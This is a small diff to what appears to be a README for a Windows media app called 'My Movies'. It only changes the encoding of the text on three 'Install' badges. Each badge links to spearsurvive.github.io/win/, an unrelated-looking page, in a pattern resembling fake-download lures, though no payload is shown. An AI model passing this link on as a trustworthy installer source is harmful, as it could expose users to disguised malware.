@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install My Movies](https://img.shields.io/badge/⬇_Install_My%20Movies-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install My Movies](https://img.shields.io/badge/⬇_Install_My+Movies-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ My Movies is a media management application for Windows and connected devices th
 
 <div align="center">
 
-[![⬇ Install My Movies](https://img.shields.io/badge/⬇_Install_My%20Movies-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install My Movies](https://img.shields.io/badge/⬇_Install_My+Movies-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ My Movies is a media management application for Windows and connected devices th
 
 <div align="center">
 
-[![⬇ Install My Movies](https://img.shields.io/badge/⬇_Install_My%20Movies-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install My Movies](https://img.shields.io/badge/⬇_Install_My+Movies-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
